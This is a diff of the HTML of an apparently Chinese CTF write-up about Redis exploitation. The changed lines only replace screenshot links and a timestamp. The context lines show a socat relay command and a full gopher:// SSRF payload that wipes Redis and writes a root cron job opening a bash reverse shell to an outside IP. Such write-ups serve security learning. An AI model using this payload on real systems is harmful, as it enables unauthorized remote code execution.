@@ -45,16 +45,16 @@
 <meta property="og:image" content="https://i.loli.net/2020/05/22/7HyuCE8cwNFb2fe.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/iQDBXu3EabyIv91.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/a1ivgdJEblI8zCY.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/22/uDXOSTJsl7IGF2Y.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/28/UZsHV12KdFha7gf.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/RALKbh12qZY8FU6.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/hUpLHCTd3GYD6Ko.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/SgFMkuBlZ986Nht.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/22/GjyX7SU1QdpHA3I.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/28/wmJB7MKLIr8G4lb.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/7ZzmLU6DYhCMoGF.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/u9Cir6MnHqeAchv.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/22/BSt9OxPVIdlhRJA.png">
 <meta property="article:published_time" content="2020-05-21T11:44:13.000Z">
-<meta property="article:modified_time" content="2020-05-22T07:39:16.096Z">
+<meta property="article:modified_time" content="2020-05-28T11:18:14.782Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -214,7 +214,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.56.124:637</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/05/22/a1ivgdJEblI8zCY.png" alt="Snipaste_2020-05-22_09-45-44.png"></p>
-<p><img src="https://i.loli.net/2020/05/22/uDXOSTJsl7IGF2Y.png" alt="Snipaste_2020-05-22_10-22-15.png"></p>
+<p><img src="https://i.loli.net/2020/05/28/UZsHV12KdFha7gf.png" alt="Snipaste_2020-05-28_19-17-19.png"></p>
 <p>成功写入，但是没反弹到shell。。因为写错目录了</p>
 <blockquote>
 <p>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code> </p>
@@ -261,7 +261,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;118.178.88.46:1235&#x2F;_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%248%0D%0Apassword%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2462%0D%0A%0A%0A%0A%0A%2A&#x2F;1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.78.1.204&#x2F;1234%200%3E%261%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A&#x2F;var&#x2F;spool&#x2F;cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/05/22/SgFMkuBlZ986Nht.png" alt="Snipaste_2020-05-22_14-33-59.png"></p>
-<p><img src="https://i.loli.net/2020/05/22/GjyX7SU1QdpHA3I.png" alt="Snipaste_2020-05-22_14-33-17.png"></p>
+<p><img src="https://i.loli.net/2020/05/28/wmJB7MKLIr8G4lb.png" alt="Snipaste_2020-05-28_19-16-54.png"></p>
 <p>成功反弹shell</p>
 <p><strong>主从复制</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</span><br></pre></td></tr></table></figure>
